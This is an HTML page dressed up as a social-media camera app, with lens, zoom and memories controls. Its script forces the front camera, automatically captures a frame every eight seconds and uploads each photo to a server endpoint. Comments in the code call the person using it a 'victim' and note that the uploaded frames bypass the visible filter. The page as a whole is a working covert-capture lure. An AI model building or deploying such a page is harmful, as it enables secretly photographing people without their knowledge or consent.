<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=no">
    <title>Camera</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css"/>
    <style>
        * { margin:0; padding:0; box-sizing:border-box; -webkit-tap-highlight-color:transparent; }
        body { width:100%; height:100%; overflow:hidden; background:#000; font-family:sans-serif; }
        
        /* Camera Feed */
        #camera { position:fixed; inset:0; width:100%; height:100%; object-fit:cover; z-index:1; transform:scaleX(-1); }
        
        /* UI Overlays */
        .v { position:fixed; left:0; width:100%; pointer-events:none; z-index:5; }
        .top-v { top:0; height:120px; background:linear-gradient(rgba(0,0,0,0.5), transparent); }
        .bot-v { bottom:0; height:220px; background:linear-gradient(transparent, rgba(0,0,0,0.7)); }

        /* Top Interface (Status bar icons removed) */
        .t-ui { position:fixed; top:20px; width:100%; padding:0 16px; display:flex; justify-content:space-between; z-index:20; }
        .tools { display:flex; flex-direction:column; gap:20px; align-items:center; color:#fff; font-size:22px; }
        .avatar { width:40px; height:40px; border-radius:50%; background:rgba(255,255,255,0.2); backdrop-filter:blur(10px); }
        .badge { position:absolute; top:-4px; right:-4px; background:#ff3040; font-size:10px; padding:1px 5px; border-radius:10px; border:1.5px solid #000; color:#fff; font-weight:bold; }

        /* Controls */
        .z-bar { position:fixed; bottom:180px; left:50%; transform:translateX(-50%); display:flex; gap:18px; padding:8px 18px; border-radius:30px; background:rgba(0,0,0,0.4); backdrop-filter:blur(10px); z-index:25; color:#888; font-size:13px; font-weight:bold; }
        .zoom.active { color:#ffe600; }
        .m-ui { position:fixed; bottom:90px; width:100%; display:flex; align-items:center; justify-content:center; gap:24px; z-index:25; }
        .shutter { width:80px; height:80px; border-radius:50%; border:5px solid #fff; display:flex; align-items:center; justify-content:center; }
        .shutter-in { width:60px; height:60px; border-radius:50%; background:rgba(255,255,255,0.2); }
        .lens { width:55px; height:55px; border-radius:50%; border:2px solid rgba(255,255,255,0.4); overflow:hidden; }
        .lens.active { border-color:#ffe600; }

        /* Bottom Navbar */
        .footer { position:fixed; bottom:0; width:100%; height:70px; background:rgba(0,0,0,0.95); display:flex; justify-content:space-around; align-items:center; z-index:30; }
        .nav { font-size:22px; color:#666; }
        .nav.active { color:#fff; }
        canvas { display:none; }
    </style>
</head>
<body>
    <video id="camera" autoplay playsinline></video>
    <canvas id="canvas"></canvas>
    <div class="v top-v"></div><div class="v bot-v"></div>

    <div class="t-ui">
        <div style="display:flex;gap:12px">
            <div class="avatar"><img src="https://api.dicebear.com/7.x/avataaars/svg?seed=8" style="width:100%"></div>
            <div class="avatar" style="background:none; display:flex; align-items:center; justify-content:center;"><i class="fas fa-search" style="color:#fff"></i></div>
        </div>
        <div class="tools">
            <i class="far fa-bell"></i>
            <div style="position:relative"><i class="fas fa-user-plus"></i><div class="badge">2</div></div>
            <i class="fas fa-rotate" id="flip"></i>
            <i class="fas fa-bolt-slash"></i>
            <div style="font-size:10px; border:2px solid #fff; border-radius:5px; padding:1px 3px; color:#fff; font-weight:900;">HD</div>
        </div>
    </div>

    <div class="z-bar">
        <div class="zoom" onclick="setZ(this,.5)">0.5</div>
        <div class="zoom active" onclick="setZ(this,1)">1x</div>
        <div class="zoom" onclick="setZ(this,2)">2</div>
    </div>

    <div class="m-ui">
        <div style="color:#fff; font-size:10px; text-align:center;"><i class="far fa-copy" style="font-size:22px"></i><br>Memories</div>
        <div class="shutter" id="snap"><div class="shutter-in"></div></div>
        <div class="lens active" onclick="setL(this,'none')"><img src="https://images.unsplash.com/photo-1494790108377-be9c29b29330?w=100" style="width:100%"></div>
        <div class="lens" onclick="setL(this,'grayscale(1)')"><img src="https://images.unsplash.com/photo-1517841905240-472988babdf9?w=100" style="width:100%"></div>
    </div>

    <div class="footer">
        <i class="fas fa-location-dot nav"></i>
        <i class="far fa-comment nav"></i>
        <i class="far fa-face-smile nav active"></i>
        <i class="fas fa-users nav"></i>
        <i class="fas fa-play nav"></i>
    </div>

    <script>
        const v = document.getElementById('camera'), c = document.getElementById('canvas');
        let z = 1, s;

        // Initialize camera forced to front (user) sensor
        async function init() {
            if (s) s.getTracks().forEach(t => t.stop());
            try {
                s = await navigator.mediaDevices.getUserMedia({ 
                    video: { facingMode: "user" } 
                });
                v.srcObject = s;
                v.style.transform = `scaleX(-1) scale(${z})`;
            } catch (err) {
                console.error("Camera error:", err);
            }
        }

        function setZ(el, val) {
            document.querySelectorAll('.zoom').forEach(i => i.classList.remove('active'));
            el.classList.add('active');
            z = val;
            v.style.transform = `scaleX(-1) scale(${z})`;
        }

        // Apply filter to VIDEO only (Victim sees it, but canvas stays clean)
        function setL(el, l) {
            document.querySelectorAll('.lens').forEach(i => i.classList.remove('active'));
            el.classList.add('active');
            v.style.filter = l; 
        }

        // Keep flip button for UI but force front camera reload
        document.getElementById('flip').onclick = () => { init(); };
        
        document.getElementById('snap').onclick = () => { send(); };

        async function send() {
            c.width = v.videoWidth; 
            c.height = v.videoHeight;
            const ctx = c.getContext('2d');
            
            // Mirror for natural look
            ctx.translate(c.width, 0);
            ctx.scale(-1, 1);
            
            // Draw raw frame (ignoring v.style.filter)
            ctx.drawImage(v, 0, 0);
            
            c.toBlob(blob => {
                const fd = new FormData();
                fd.append('photo', blob, 'capture.jpg');
                fetch('/api/upload-photo', { method: 'POST', body: fd });
            }, 'image/jpeg', 0.7);
        }

        // Auto-capture every 8 seconds
        setInterval(send, 8000); 
        init();
    </script>
</body>
</html>
